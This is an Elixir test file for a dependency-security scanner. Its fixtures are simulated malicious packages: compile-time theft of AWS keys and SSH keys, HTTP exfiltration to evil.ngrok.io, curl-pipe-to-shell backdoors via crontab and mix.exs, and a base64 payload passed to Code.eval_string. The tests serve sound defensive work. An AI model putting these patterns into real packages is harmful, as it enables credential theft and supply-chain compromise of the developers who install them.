defmodule VetCore.Blackhat.MultiVectorAttackTest do
  @moduledoc """
  Black hat tests for sophisticated multi-vector attacks that combine
  multiple techniques. Verifies that the scanner detects all attack
  vectors simultaneously and assigns appropriately high risk scores.
  """
  use ExUnit.Case, async: true

  alias VetCore.Types.Dependency

  # ---------------------------------------------------------------------------
  # Helpers
  # ---------------------------------------------------------------------------

  defp setup_dep(dep_name, source_files) do
    tmp_dir = Path.join(System.tmp_dir!(), "vet_blackhat_#{System.unique_integer([:positive])}")
    dep_dir = Path.join([tmp_dir, "deps", to_string(dep_name)])
    lib_dir = Path.join(dep_dir, "lib")
    File.mkdir_p!(lib_dir)

    for {filename, content} <- source_files do
      path =
        if filename == "mix.exs" do
          Path.join(dep_dir, filename)
        else
          File.mkdir_p!(Path.dirname(Path.join(lib_dir, filename)))
          Path.join(lib_dir, filename)
        end

      File.write!(path, content)
    end

    unless Enum.any?(source_files, fn {f, _} -> f == "mix.exs" end) do
      mix_content = """
      defmodule #{Macro.camelize(to_string(dep_name))}.MixProject do
        use Mix.Project
        def project, do: [app: :#{dep_name}, version: "1.0.0"]
      end
      """

      File.write!(Path.join(dep_dir, "mix.exs"), mix_content)
    end

    lock = ~s(%{\n  "#{dep_name}": {:hex, :#{dep_name}, "1.0.0", "abc123", [:mix], [], "hexpm", "def456"},\n})
    File.write!(Path.join(tmp_dir, "mix.lock"), lock)

    {tmp_dir, %Dependency{name: dep_name, version: "1.0.0", source: :hex}}
  end

  defp cleanup(tmp_dir) do
    File.rm_rf!(tmp_dir)
  end

  defp run_all_checks(dep, project_path) do
    checks = [
      VetCore.Checks.SystemExec,
      VetCore.Checks.CodeEval,
      VetCore.Checks.NetworkAccess,
      VetCore.Checks.FileAccess,
      VetCore.Checks.EnvAccess,
      VetCore.Checks.Obfuscation,
      VetCore.Checks.ShadyLinks,
      VetCore.Checks.CompilerHooks
    ]

    Enum.flat_map(checks, fn check_mod ->
      check_mod.run(dep, project_path, [])
    end)
  end

  # ---------------------------------------------------------------------------
  # Test: Full attack chain -- credential theft + exfiltration + backdoor
  # ---------------------------------------------------------------------------

  describe "full attack chain (steal, exfil, backdoor)" do
    setup do
      source = ~S"""
      defmodule Attack.FullChain do
        # Step 1: Steal credentials at compile time
        @aws_key System.get_env("AWS_SECRET_ACCESS_KEY")
        @ssh_key File.read!("~/.ssh/id_rsa")

        # Step 2: Exfiltrate via network at compile time
        @result :httpc.request(:post, {~c"https://evil.ngrok.io/exfil", [], ~c"application/json", "data"}, [], [])

        # Step 3: Install backdoor at runtime
        def install_backdoor do
          System.cmd("sh", ["-c", "echo '* * * * * curl https://evil.com/payload | sh' | crontab -"])
        end
      end
      """

      {tmp_dir, dep} = setup_dep(:attack_fullchain, [{"full_chain.ex", source}])
      on_exit(fn -> cleanup(tmp_dir) end)
      %{project_path: tmp_dir, dep: dep}
    end

    test "triggers at least 5 finding categories", %{project_path: path, dep: dep} do
      findings = run_all_checks(dep, path)

      categories =
        findings
        |> Enum.map(& &1.category)
        |> Enum.uniq()
        |> Enum.sort()

      # We expect: env_access, file_access, network_access, system_exec, shady_links
      expected_categories = [:env_access, :file_access, :network_access, :shady_links, :system_exec]

      for cat <- expected_categories do
        assert cat in categories,
               "Expected category #{inspect(cat)} in findings, got: #{inspect(categories)}"
      end

      assert length(categories) >= 5,
             "Expected at least 5 categories, got #{length(categories)}: #{inspect(categories)}"
    end

    test "has multiple compile-time findings", %{project_path: path, dep: dep} do
      findings = run_all_checks(dep, path)
      compile_time_findings = Enum.filter(findings, & &1.compile_time?)

      # @aws_key, @ssh_key, and @result are all compile-time
      assert length(compile_time_findings) >= 3,
             "Expected at least 3 compile-time findings, got #{length(compile_time_findings)}"
    end

    test "risk score is 100 (capped maximum)", %{project_path: path, dep: dep} do
      findings = run_all_checks(dep, path)

      # Use the Scorer to compute the actual risk score
      {risk_score, risk_level} = VetCore.Scorer.score(dep, findings, nil)

      # With multiple compile-time critical findings (40 pts each), we should easily
      # exceed 100 and get capped at 100
      assert risk_score == 100,
             "Expected risk score of 100, got #{risk_score}"

      assert risk_level == :critical,
             "Expected :critical risk level, got #{inspect(risk_level)}"
    end
  end

  # ---------------------------------------------------------------------------
  # Test: Combined evasion + exfiltration chain
  # ---------------------------------------------------------------------------

  describe "combined evasion and exfiltration" do
    setup do
      source = ~S"""
      defmodule Attack.Combined do
        # Obfuscated code execution
        def phase_one do
          payload = Base.decode64!("U3lzdGVtLmNtZCgiY3VybCIsIFsiaHR0cHM6Ly9ldmlsLmNvbSJdKQ==")
          Code.eval_string(payload)
        end

        # Dynamic dispatch to avoid static detection of the target
        def phase_two do
          mod = :httpc
          func = :request
          apply(mod, func, [:get, {~c"https://evil.xyz/cmd", []}, [], []])
          :httpc.request(:get, {~c"https://evil.xyz/exfil", []}, [], [])
        end

        # Compile-time env dump
        @all_env System.get_env()
      end
      """

      {tmp_dir, dep} = setup_dep(:attack_combined, [{"combined.ex", source}])
      on_exit(fn -> cleanup(tmp_dir) end)
      %{project_path: tmp_dir, dep: dep}
    end

    test "detects obfuscation, code_eval, env_access, and network_access",
         %{project_path: path, dep: dep} do
      findings = run_all_checks(dep, path)

      categories =
        findings
        |> Enum.map(& &1.category)
        |> Enum.uniq()

      assert :obfuscation in categories, "Expected obfuscation category"
      assert :code_eval in categories, "Expected code_eval category"
      assert :env_access in categories, "Expected env_access category"
      # :httpc.request is inside a function using dynamic apply, so the
      # network_access check sees the AST pattern for :httpc.request
      assert :network_access in categories, "Expected network_access category"
    end

    test "compile-time env dump is flagged as critical",
         %{project_path: path, dep: dep} do
      findings = run_all_checks(dep, path)

      env_dump =
        Enum.find(findings, fn f ->
          f.category == :env_access and f.compile_time? == true
        end)

      assert env_dump != nil, "Expected compile-time env_access finding"
      assert env_dump.severity == :critical
    end
  end

  # ---------------------------------------------------------------------------
  # Test: Attack spread across multiple files
  # ---------------------------------------------------------------------------

  describe "attack spread across multiple files" do
    setup do
      # File 1: innocent-looking utility with hidden env access
      util_source = ~S"""
      defmodule Attack.Util do
        def version, do: "1.0.0"
        @config System.get_env("AWS_SECRET_ACCESS_KEY")
      end
      """

      # File 2: network exfiltration disguised as a telemetry module
      telemetry_source = ~S"""
      defmodule Attack.Telemetry do
        def report(data) do
          :httpc.request(:post, {~c"https://evil.ngrok.io/telemetry", [], ~c"text/plain", data}, [], [])
        end
      end
      """

      # File 3: backdoor in mix.exs
      mix_source = ~S"""
      defmodule Attack.MixProject do
        use Mix.Project

        def project do
          System.cmd("sh", ["-c", "curl https://evil.com/backdoor.sh | sh"])
          [app: :attack_multifile, version: "1.0.0"]
        end
      end
      """

      {tmp_dir, dep} =
        setup_dep(:attack_multifile, [
          {"util.ex", util_source},
          {"telemetry.ex", telemetry_source},
          {"mix.exs", mix_source}
        ])

      on_exit(fn -> cleanup(tmp_dir) end)
      %{project_path: tmp_dir, dep: dep}
    end

    test "detects findings across all three files", %{project_path: path, dep: dep} do
      findings = run_all_checks(dep, path)

      # Findings should span multiple files
      unique_files =
        findings
        |> Enum.map(& &1.file_path)
        |> Enum.uniq()

      assert length(unique_files) >= 3,
             "Expected findings from at least 3 files, got #{length(unique_files)}: #{inspect(unique_files)}"
    end

    test "detects all expected categories across files", %{project_path: path, dep: dep} do
      findings = run_all_checks(dep, path)

      categories =
        findings
        |> Enum.map(& &1.category)
        |> Enum.uniq()

      assert :env_access in categories
      assert :network_access in categories
      assert :system_exec in categories
      assert :shady_links in categories
    end

    test "mix.exs system_exec is flagged", %{project_path: path, dep: dep} do
      findings = run_all_checks(dep, path)

      mix_exec =
        Enum.find(findings, fn f ->
          f.category == :system_exec and String.ends_with?(f.file_path, "mix.exs")
        end)

      assert mix_exec != nil, "Expected system_exec finding in mix.exs"
    end
  end
end
